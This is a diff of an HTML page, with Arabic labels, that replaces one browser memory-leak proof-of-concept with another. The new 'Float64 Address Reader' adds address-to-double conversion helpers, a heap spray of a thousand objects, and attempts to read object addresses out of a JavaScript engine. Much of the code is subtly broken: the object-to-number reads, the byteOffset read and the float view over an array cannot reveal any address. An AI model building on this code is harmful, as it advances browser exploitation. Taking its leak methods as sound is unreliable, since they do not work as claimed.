@@ -1,65 +1,103 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h2>PoC 1: Structure ID Leak Hunter</h2>
-<button onclick="runLeakHunt()">ابدأ البحث</button>
-<div id="log" style="font-family: monospace; white-space: pre;"></div>
+<h2>PoC 2: Float64 Address Reader</h2>
+<button onclick="runFloatLeak()">اقرأ عناوين الذاكرة</button>
+<div id="output" style="font-family: monospace; white-space: pre; background: #000; color: #0f0; padding: 10px;"></div>
 
 <script>
 function log(msg) {
-    document.getElementById('log').textContent += msg + '\n';
-    console.log(msg);
+    document.getElementById('output').textContent += msg + '\n';
 }
 
-// دالة مساعدة: استخراج أي hex من string
-function extractHex(str) {
-    const matches = str.match(/0x[0-9a-fA-F]+/g) || [];
-    return matches;
+// أدوات التحويل الأساسية
+const f64 = new Float64Array(1);
+const u64 = new BigUint64Array(f64.buffer);
+const u32 = new Uint32Array(f64.buffer);
+
+function addrToDouble(addr) {
+    u64[0] = BigInt(addr);
+    return f64[0];
 }
 
-function runLeakHunt() {
-    log('=== Structure ID Leak Hunter ===\n');
+function doubleToAddr(d) {
+    f64[0] = d;
+    return '0x' + u64[0].toString(16);
+}
+
+function runFloatLeak() {
+    log('=== Float64 Address Leak ===\n');
     
-    // 1. إنشاء object فاسد
-    const corruptObj = {};
-    Object.defineProperty(corruptObj, 'toString', {
-        get: function() {
-            throw new Error('Corrupted object access');
-        }
-    });
+    // إنشاء عدة objects في الذاكرة
+    const objects = [];
+    for (let i = 0; i < 10; i++) {
+        objects.push({
+            tag: 'OBJ_' + i,
+            data: new ArrayBuffer(1024),
+            marker: 0x4141414141414141n
+        });
+    }
     
-    // 2. تجربة كل طريقة ممكنة لتسريب معلومات
-    const leakMethods = [
-        () => { try { return JSON.stringify(corruptObj); } catch(e) { return e.message; }},
-        () => { try { return String(corruptObj); } catch(e) { return e.message; }},
-        () => { try { return Object.prototype.toString.call(corruptObj); } catch(e) { return e.message; }},
-        () => { try { return `${corruptObj}`; } catch(e) { return e.message; }},
-        () => { try { return corruptObj + ''; } catch(e) { return e.message; }},
-        () => { try { return [].join.call(corruptObj); } catch(e) { return e.message; }},
-        () => { try { return Array.from(corruptObj); } catch(e) { return e.message; }},
-        () => { try { return Object.keys(corruptObj); } catch(e) { return e.message; }},
-        () => { try { return Object.values(corruptObj); } catch(e) { return e.message; }},
-        () => { try { return Object.entries(corruptObj); } catch(e) { return e.message; }},
-    ];
-    
-    leakMethods.forEach((fn, i) => {
+    // محاولة قراءة كل object كـ double
+    objects.forEach((obj, i) => {
+        log(`\n--- Object ${i} ---`);
+        
+        // جرب قراءة الـ object نفسه
         try {
-            const result = fn();
-            const hexLeaked = extractHex(String(result));
-            if (hexLeaked.length > 0) {
-                log(`🔥 LEAK FOUND! Method ${i}: ${hexLeaked.join(', ')}`);
-            } else {
-                log(`Method ${i}: No hex leak (${String(result).substring(0,50)})`);
+            const asDouble = Number(obj);
+            if (!isNaN(asDouble) && asDouble !== 0) {
+                log(`Object as double: ${asDouble}`);
+                log(`Converted to addr: ${doubleToAddr(asDouble)}`);
             }
-        } catch(e) {
-            const hexLeaked = extractHex(e.message || String(e));
-            if (hexLeaked.length > 0) {
-                log(`🔥 LEAK IN ERROR! Method ${i}: ${hexLeaked.join(', ')}`);
-            }
-        }
+        } catch(e) {}
+        
+        // جرب خصائص الـ object
+        try {
+            // هذا قد يُسرب عنوان الـ ArrayBuffer
+            const view = new Uint8Array(obj.data);
+            const leaked = view.byteOffset;
+            log(`ArrayBuffer byteOffset: 0x${leaked.toString(16)}`);
+        } catch(e) {}
+        
+        // جرب BigInt property
+        try {
+            const markerDouble = Number(obj.marker);
+            log(`Marker as double: ${markerDouble}`);
+        } catch(e) {}
     });
     
-    log('\n=== البحث اكتمل ===');
+    log('\n=== Heap Spray & Read ===\n');
+    
+    // Heap spray بـ objects متشابهة
+    const spray = [];
+    for (let i = 0; i < 1000; i++) {
+        spray.push({
+            a: 1.1, b: 2.2, c: 3.3,
+            str: 'MARKER_' + i,
+            buf: new ArrayBuffer(64)
+        });
+    }
+    
+    // محاولة إيجاد pattern في الذاكرة
+    log(`Sprayed ${spray.length} objects`);
+    
+    // جرب الوصول لـ object عبر index خاطئ
+    try {
+        const fakeArray = new Array(100);
+        fakeArray[50] = spray[0];
+        
+        // قراءة كـ float64
+        const f64View = new Float64Array(fakeArray.buffer);
+        for (let i = 0; i < 20; i++) {
+            if (f64View[i] !== 0) {
+                log(`f64[${i}] = ${f64View[i]} → ${doubleToAddr(f64View[i])}`);
+            }
+        }
+    } catch(e) {
+        log(`Error: ${e.message}`);
+    }
+    
+    log('\n=== انتهى PoC 2 ===');
 }
 </script>
 </body>
